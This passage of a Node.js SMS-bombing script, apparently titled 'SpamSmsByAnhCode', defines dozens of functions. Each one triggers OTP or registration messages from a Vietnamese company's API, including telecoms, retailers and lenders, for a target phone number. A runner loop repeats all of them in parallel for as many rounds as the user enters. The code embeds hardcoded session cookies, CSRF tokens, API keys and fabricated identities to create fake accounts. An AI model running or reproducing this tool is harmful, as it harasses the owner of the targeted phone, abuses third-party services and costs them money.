        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'key': 'c3ef5fcbab3e7ebd82794a39da791ff6',
        'origin': 'https://thefaceshop.com.vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ phoneNumber: sdt }),
    });
    console.log('TheFaceShop OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('thefaceshop:', e.message); }
}

async function send_otp_via_BEAUTYBOX(sdt) {
  try {
    const res = await post('https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification', {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'key': 'ac41e98f028aa44aac947da26ceb7cff',
        'origin': 'https://beautybox.com.vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ phoneNumber: sdt }),
    });
    console.log('BeautyBox OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('beautybox:', e.message); }
}

async function send_otp_via_winmart(sdt) {
  try {
    const res = await post('https://api-crownx.winmart.vn/iam/api/v1/user/register', {
      headers: {
        'accept': 'application/json',
        'content-type': 'application/json',
        'authorization': 'Bearer undefined',
        'origin': 'https://winmart.vn',
        'x-api-merchant': 'WCM',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ firstName: 'Nguyễn Quang Ngọc', phoneNumber: sdt, masanReferralCode: '', dobDate: '2000-02-05', gender: 'Male' }),
    });
    console.log('WinMart2 OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('winmart2:', e.message); }
}

async function send_otp_via_futabus(sdt) {
  try {
    const res = await post('https://api.vato.vn/api/authenticate/request_code', {
      headers: {
        'accept': 'application/json',
        'content-type': 'application/json',
        'x-access-token': 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhbm9ueW1vdXMiOnRydWV9.ignore',
        'x-app-id': 'client',
        'origin': 'https://futabus.vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ phoneNumber: sdt, deviceId: 'd46a74f1-09b9-4db6-b022-aaa9d87e11ed', use_for: 'LOGIN' }),
    });
    console.log('FutaBus OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('futabus:', e.message); }
}

async function send_otp_via_ViettelPost(sdt) {
  try {
    const res = await post('https://id.viettelpost.vn/Account/SendOTPByPhone', {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'null',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: urlEncoded({ 'FormRegister.FullName': 'Nguyễn Quang Ngọc', 'FormRegister.Phone': sdt, 'FormRegister.Password': 'BEAUTYBOX12a@', 'FormRegister.ConfirmPassword': 'BEAUTYBOX12a@', ConfirmOtpType: 'Register', 'FormRegister.IsRegisterFromPhone': 'true', '__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv8kQF_TsFhcp3PSmVMgL4cFBdDdGs-g35Tm7OsyC3m_0Z1euQaHjJ12RKwIZ9W6nZ9ByBew4Qn49WIN8i8UecSrnHXhWprzW9hpRmOi4k_f5WQbgXyA9h0bgipkYiJjfoc' }),
    });
    console.log('ViettelPost OTP:', res.status);
  } catch (e) { console.error('viettelpost:', e.message); }
}

async function send_otp_via_myviettel2(sdt) {
  try {
    const res = await post('https://viettel.vn/api/get-otp-contract-mobile', {
      headers: {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://viettel.vn',
        'X-CSRF-TOKEN': 'PCRPIvstcYaGt1K9tSEwTQWaTADrAS8vADc3KGN7',
        'X-Requested-With': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ msisdn: sdt, type: 'register' }),
    });
    console.log('MyViettel2 OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('myviettel2:', e.message); }
}

async function send_otp_via_myviettel3(sdt) {
  try {
    const res = await post('https://viettel.vn/api/get-otp', {
      headers: {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://viettel.vn',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; redirectLogin=https://viettel.vn/dang-ky',
      },
      body: JSON.stringify({ msisdn: sdt }),
    });
    console.log('MyViettel3 OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('myviettel3:', e.message); }
}

async function send_otp_via_TOKYOLIFE(sdt) {
  try {
    const res = await post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'signature': 'c5b0d82fae6baaced6c7f383498dfeb5',
        'timestamp': Date.now().toString(),
        'origin': 'https://tokyolife.vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ phone_number: sdt, name: 'Nguyễn Quang Ngọc', password: 'pUL3.GFSd4MWYXp', email: 'reggg10tb@gmail.com', birthday: '2002-03-12', gender: 'male' }),
    });
    console.log('TokyoLife OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('tokyolife:', e.message); }
}

async function send_otp_via_30shine(sdt) {
  try {
    const res = await post('https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send', {
      headers: {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://30shine.com',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ phone: sdt }),
    });
    console.log('30Shine OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('30shine:', e.message); }
}

async function send_otp_via_Cathaylife(sdt) {
  try {
    const memberMap = JSON.stringify({ userName: 'rancellramseyis792@gmail.com', password: 'traveLo@a123', birthday: '03/07/2001', certificateNumber: '034202008372', phone: sdt, email: 'rancellramseyis792@gmail.com', LINK_FROM: 'signUp2', memberID: '', CUSTOMER_NAME: 'Nguyễn Quang Ngọc' });
    const res = await post('https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP', {
      headers: {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://www.cathaylife.com.vn',
        'X-Requested-With': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'cookie': 'JSESSIONID=ZjlRw5Octkf1Q0h4y7wuolSd.06283f0e-f7d1-36ef-bc27-6779aba32e74',
      },
      body: urlEncoded({ memberMap, OTP_TYPE: 'P', LANGS: 'vi_VN' }),
    });
    console.log('CathayLife OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('cathaylife:', e.message); }
}

async function send_otp_via_dominos(sdt) {
  try {
    const res = await post('https://dominos.vn/api/v1/users/send-otp', {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'dmn': 'DSNKFN',
        'secret': 'bPG0upAJLk0gz/2W1baS2Q==',
        'origin': 'https://dominos.vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ phone_number: sdt, email: 'rancellramseyis792@gmail.com', type: 0, is_register: true }),
    });
    console.log('Dominos OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('dominos:', e.message); }
}

async function send_otp_via_vinamilk(sdt) {
  try {
    const res = await post('https://new.vinamilk.com.vn/api/account/getotp', {
      headers: {
        'accept': '*/*',
        'content-type': 'text/plain;charset=UTF-8',
        'authorization': 'Bearer null',
        'origin': 'https://new.vinamilk.com.vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ type: 'register', phone: sdt }),
    });
    console.log('Vinamilk OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('vinamilk:', e.message); }
}

async function send_otp_via_vietloan2(sdt) {
  try {
    const res = await post('https://vietloan.vn/register/phone-resend', {
      headers: {
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://vietloan.vn',
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: urlEncoded({ phone: sdt, _token: '0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU' }),
    });
    console.log('Vietloan2 OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('vietloan2:', e.message); }
}

async function send_otp_via_batdongsan(sdt) {
  try {
    const res = await get(`https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber=${encodeURIComponent(sdt)}`, {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'origin': 'https://batdongsan.com.vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
    });
    console.log('BatDongSan OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('batdongsan:', e.message); }
}

async function send_otp_via_GUMAC(sdt) {
  try {
    const res = await post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', {
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Origin': 'https://gumac.vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ phone: sdt }),
    });
    console.log('GUMAC OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('gumac:', e.message); }
}

async function send_otp_via_mutosi(sdt) {
  try {
    const res = await post('https://api-omni.mutosi.com/client/auth/register', {
      headers: {
        'Accept': 'application/json, text/plain, */*',
        'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
        'Content-Type': 'application/json',
        'Origin': 'https://mutosi.com',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ name: 'Hà Khải', phone: sdt, password: 'Vjyy1234@', confirm_password: 'Vjyy1234@', firstname: null, lastname: null, verify_otp: 0, store_token: '226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b', email: 'de@gmail.com', birthday: '2006-02-13', accept_the_terms: 1, receive_promotion: 1 }),
    });
    console.log('Mutosi OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('mutosi:', e.message); }
}

async function send_otp_via_mutosi1(sdt) {
  try {
    const res = await post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', {
      headers: {
        'Accept': 'application/json, text/plain, */*',
        'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
        'Content-Type': 'application/json',
        'Origin': 'https://mutosi.com',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ phone: sdt, source: 'web_consumers' }),
    });
    console.log('Mutosi1 OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('mutosi1:', e.message); }
}

async function send_otp_via_vietair(sdt) {
  try {
    const res = await post('https://vietair.com.vn/Handler/CoreHandler.ashx', {
      headers: {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://vietair.com.vn',
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: urlEncoded({ op: 'PACKAGE_HTTP_POST', path_ajax_post: '/service03/sms/get', package_name: 'PK_FD_SMS_OTP', object_name: 'INS', P_MOBILE: sdt, P_TYPE_ACTIVE_CODE: 'DANG_KY_NHAN_OTP' }),
    });
    console.log('Vietair OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('vietair:', e.message); }
}

async function send_otp_via_FAHASA(sdt) {
  try {
    const res = await post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', {
      headers: {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.fahasa.com',
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'cookie': 'frontend=173c6828799e499e81cd64a949e2c73a; frontend_cid=7bCDwdDzwf8wpQKE',
      },
      body: urlEncoded({ phone: sdt }),
    });
    console.log('FAHASA OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('fahasa:', e.message); }
}

async function send_otp_via_hopiness(sdt) {
  try {
    const res = await post('https://shopiness.vn/ajax/user', {
      headers: {
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://shopiness.vn',
        'X-Requested-With': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: urlEncoded({ action: 'verify-registration-info', phoneNumber: sdt, refCode: '' }),
    });
    console.log('Hopiness OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('hopiness:', e.message); }
}

async function send_otp_via_modcha35(sdt) {
  try {
    const res = await post('https://v2sslapimocha35.mocha.com.vn/ReengBackendBiz/genotp/v32', {
      headers: {
        'User-Agent': 'mocha/1.28 (iPhone; iOS 17.0.2; Scale/3.00)',
        'Content-Type': 'application/x-www-form-urlencoded',
        'uuid': 'B4DD9661-2B0B-418F-B953-6AE71C0373EC',
        'APPNAME': 'MC35',
        'countryCode': 'VN',
        'languageCode': 'vi',
        'Accept-Language': 'vi-VN;q=1',
      },
      body: `clientType=ios&countryCode=VN&device=iPhone15%2C3&os_version=iOS_17.0.2&platform=ios&revision=11224&username=${encodeURIComponent(sdt)}&version=1.28`,
    });
    console.log('Mocha35 OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('modcha35:', e.message); }
}

async function send_otp_via_Bibabo(sdt) {
  try {
    const res = await get(`https://one.bibabo.vn/api/v1/login/otp/createOtp?phone=${encodeURIComponent(sdt)}&reCaptchaToken=undefined&appId=7&version=2`, {
      headers: {
        'User-Agent': 'bibabo/522 CFNetwork/1474 Darwin/23.0.0',
        'Accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9',
      },
    });
    console.log('Bibabo OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('bibabo:', e.message); }
}

async function send_otp_via_MOCA(sdt) {
  try {
    const res = await get(`https://moca.vn/moca/v2/users/role?phoneNumber=${encodeURIComponent(sdt)}`, {
      headers: {
        'User-Agent': 'Pass/2.10.156 (iPhone; iOS 17.0.2; Scale/3.00)',
        'device-token': '4ADAF544-AB6D-4B7F-985A-BF6DAEAA38EA',
        'device-id': 'b51fb1bf16bd391f0b22e68ebf9efb3966acecfc0d587a91031b504754e312f1',
        'accept-language': 'vi',
        'x-moca-api-version': '2',
        'platform': 'P_IOS-2.10.156',
        'date': new Date().toUTCString(),
        'pre-authorization': 'hmac username="06b707de-6050-11eb-ae93-0242ac130002", algorithm="hmac-sha256", headers="date digest", signature="cZevTUC0yW+WSAVer9McsgpV79XoaL+BTnocoHuzBjw="',
      },
    });
    console.log('MOCA OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('moca:', e.message); }
}

async function send_otp_via_pantio(sdt) {
  try {
    const res = await post('https://api.suplo.vn/v1/auth/customer/otp/sms/generate?domain=pantiofashion.myharavan.com', {
      headers: {
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://pantio.vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: urlEncoded({ phoneNumber: sdt }),
    });
    console.log('Pantio OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('pantio:', e.message); }
}

async function send_otp_via_Routine(sdt) {
  try {
    const res = await post('https://routine.vn/index.php?route=advancedlogin/otp/sendotp', {
      headers: {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://routine.vn',
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: urlEncoded({ action_type: '1', tel: sdt }),
    });
    console.log('Routine OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('routine:', e.message); }
}

async function send_otp_via_vayvnd(sdt) {
  try {
    const h = {
      'accept': 'application/json',
      'content-type': 'application/json; charset=utf-8',
      'origin': 'https://vayvnd.vn',
      'site-id': '3',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    };
    await post('https://api.vayvnd.vn/v2/users', { headers: h, body: JSON.stringify({ phone: sdt, utm: [{ utm_source: 'leadbit', utm_medium: 'cpa' }], cpaId: 2, sourceSite: 3, trackingId: 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2' }) });
    const res = await post('https://api.vayvnd.vn/v2/users/password-reset', { headers: h, body: JSON.stringify({ login: sdt, trackingId: 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2' }) });
    console.log('VayVND OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('vayvnd:', e.message); }
}

async function send_otp_via_tima(sdt) {
  try {
    const res = await post('https://tima.vn/Borrower/RegisterLoanCreditFast', {
      headers: {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://tima.vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'cookie': 'ASP.NET_SessionId=m1ooydpmdnksdwkm4lkadk4p; tbllender=tbllender',
      },
      body: urlEncoded({ application_full_name: generateRandomName(), application_mobile_phone: sdt, CityId: '1', DistrictId: '16', rules: 'true', TypeTime: '1', application_amount: '0', application_term: '0', IsApply: '1', ProvinceName: 'Thành phố Hà Nội', DistrictName: 'Huyện Sóc Sơn', product_id: '2' }),
    });
    console.log('TIMA OTP:', res.status);
  } catch (e) { console.error('tima:', e.message); }
}

async function send_otp_via_moneygo(sdt) {
  try {
    const res = await post('https://moneygo.vn/dang-ki-vay-nhanh', {
      headers: {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://moneygo.vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'cookie': 'XSRF-TOKEN=eyJpdiI6IlJZYnY1ZHhEVmdBRXpIbXcza3A0N2c9PSJ9; laravel_session=eyJpdiI6IlpHaDc2cGgyc0g0akhrdHFkT0tic1E5PSJ9',
      },
      body: urlEncoded({ _token: 'X7pFLFlcnTEmsfjHE5kcPA1KQyhxf6qqL6uYtWCV', total: '56688000', phone: sdt, agree: '1' }),
    });
    console.log('MoneyGo OTP:', res.status);
  } catch (e) { console.error('moneygo:', e.message); }
}

async function send_otp_via_takomo(sdt) {
  try {
    const res = await post('https://lk.takomo.vn/api/4/client/otp/send', {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://lk.takomo.vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'cookie': '__sbref=mkmvwcnohbkannbumnilmdikhgdagdlaumjfsexo',
      },
      body: JSON.stringify({ data: { phone: sdt, code: 'resend', channel: 'ivr' } }),
    });
    console.log('Takomo OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('takomo:', e.message); }
}

async function send_otp_via_paynet(sdt) {
  try {
    const res = await post('https://merchant.paynetone.vn/User/GetOTP', {
      headers: {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://merchant.paynetone.vn',
        'X-Requested-With': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: urlEncoded({ MobileNumber: sdt, IsForget: 'N' }),
      rejectUnauthorized: false,
    });
    console.log('PayNet OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('paynet:', e.message); }
}

async function send_otp_via_pico(sdt) {
  try {
    await post('https://auth.pico.vn/user/api/auth/register', {
      headers: { 'accept': '*/*', 'content-type': 'application/json', 'origin': 'https://pico.vn', 'user-agent': 'Mozilla/5.0', 'region-code': 'MB' },
      body: JSON.stringify({ name: generateRandomName(), phone: sdt, provinceCode: '92', districtCode: '925', wardCode: '31261', address: '123' }),
    });
    const res = await post('https://auth.pico.vn/user/api/auth/login/request-otp', {
      headers: { 'accept': 'application/json, text/plain, */*', 'content-type': 'application/json', 'access': '206f5b6838b4e357e98bf68dbb8cdea5', 'channel': 'b2c', 'origin': 'https://pico.vn', 'user-agent': 'Mozilla/5.0', 'region-code': 'MB', 'uuid': 'cc31d0b5815a483b92f547ab8438da53' },
      body: JSON.stringify({ phone: sdt }),
    });
    console.log('PICO OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('pico:', e.message); }
}

async function send_otp_via_PNJ(sdt) {
  try {
    const res = await post('https://www.pnj.com.vn/customer/otp/request', {
      headers: {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.pnj.com.vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'cookie': 'CDPI_VISITOR_ID=78166678-ea1e-47ae-9e12-145c5a5fafc4; XSRF-TOKEN=eyJpdiI6Ii92NXRtY2VHaHBSZlgwZXJnOUNBUEE9PSJ9; mypnj_session=eyJpdiI6IjJVU3I0S0hSbFI4aW5jakZDeVR2YUE9PSJ9',
      },
      body: urlEncoded({ _method: 'POST', _token: '0BBfISeNy2M92gosYZryQ5KbswIDry4KRjeLwvhU', type: 'zns', phone: sdt }),
    });
    console.log('PNJ OTP:', res.status);
  } catch (e) { console.error('pnj:', e.message); }
}

async function send_otp_via_TINIWORLD(sdt) {
  try {
    const res = await post('https://prod-tini-id.nkidworks.com/auth/tinizen', {
      headers: {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://prod-tini-id.nkidworks.com',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'cookie': 'connect.sid=s%3AH8p0CvGBaMDVy6Y2qO_m3DzTZqtnMCt4.Cq%2FVc%2FYiObV281zVYSUk7z7Zzq%2F5sxH877UXY2Lz9XU',
      },
      body: urlEncoded({ _csrf: '', clientId: '609168b9f8d5275ea1e262d6', redirectUrl: 'https://tiniworld.com', phone: sdt }),
    });
    console.log('TINIWORLD OTP:', res.status);
  } catch (e) { console.error('tiniworld:', e.message); }
}

// ─── runner ─────────────────────────────────────────────────────────────────

const ALL_FUNCTIONS = [
  send_otp_via_sapo, send_otp_via_viettel, send_otp_via_medicare, send_otp_via_tv360,
  send_otp_via_dienmayxanh, send_otp_via_kingfoodmart, send_otp_via_mocha, send_otp_via_fptdk,
  send_otp_via_fptmk, send_otp_via_VIEON, send_otp_via_ghn, send_otp_via_lottemart,
  send_otp_via_DONGCRE, send_otp_via_shopee, send_otp_via_TGDD, send_otp_via_fptshop,
  send_otp_via_WinMart, send_otp_via_vietloan, send_otp_via_lozi, send_otp_via_F88,
  send_otp_via_vinpearl, send_otp_via_traveloka, send_otp_via_dongplus,
  send_otp_via_longchau, send_otp_via_longchau1, send_otp_via_galaxyplay, send_otp_via_emartmall,
  send_otp_via_ahamove, send_otp_via_ViettelMoney, send_otp_via_xanhsmsms, send_otp_via_xanhsmzalo,
  send_otp_via_popeyes, send_otp_via_ACHECKIN, send_otp_via_APPOTA, send_otp_via_Watsons,
  send_otp_via_hoangphuc, send_otp_via_fmcomvn, send_otp_via_Reebokvn, send_otp_via_thefaceshop,
  send_otp_via_BEAUTYBOX, send_otp_via_winmart, send_otp_via_futabus,
  send_otp_via_ViettelPost, send_otp_via_myviettel2, send_otp_via_myviettel3, send_otp_via_TOKYOLIFE,
  send_otp_via_30shine, send_otp_via_Cathaylife, send_otp_via_dominos, send_otp_via_vinamilk,
  send_otp_via_vietloan2, send_otp_via_batdongsan, send_otp_via_GUMAC, send_otp_via_mutosi,
  send_otp_via_mutosi1, send_otp_via_vietair, send_otp_via_FAHASA, send_otp_via_hopiness,
  send_otp_via_modcha35, send_otp_via_Bibabo, send_otp_via_MOCA, send_otp_via_pantio,
  send_otp_via_Routine, send_otp_via_vayvnd, send_otp_via_tima, send_otp_via_moneygo,
  send_otp_via_takomo, send_otp_via_paynet, send_otp_via_pico, send_otp_via_PNJ,
  send_otp_via_TINIWORLD,
];

const MAX_CONCURRENT = 30;

async function runRound(phone, roundNum) {
  const chunks = [];
  for (let i = 0; i < ALL_FUNCTIONS.length; i += MAX_CONCURRENT) {
    chunks.push(ALL_FUNCTIONS.slice(i, i + MAX_CONCURRENT));
  }
  for (const chunk of chunks) {
    await Promise.all(chunk.map(fn => fn(phone).catch(e => console.error(fn.name, e.message))));
  }
  console.log(`\x1b[34mSpam thành công lần: ${roundNum}\x1b[0m`);
  for (let j = 4; j >= 1; j--) {
    process.stdout.write(`Vui lòng chờ ${j} giây\r`);
    await new Promise(r => setTimeout(r, 1000));
  }
  process.stdout.write('\n');
}

async function main() {
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  const ask = q => new Promise(r => rl.question(q, r));

  console.log('\x1b[1;34mSpamSmsByAnhCode - Node.js port\x1b[0m');
  const phone = await ask('Nhập số điện thoại: ');
  const count = parseInt(await ask('Nhập số lần spam: '), 10);
  rl.close();

  for (let i = 1; i <= count; i++) {
    await runRound(phone, i);
  }
}

main().catch(console.error);
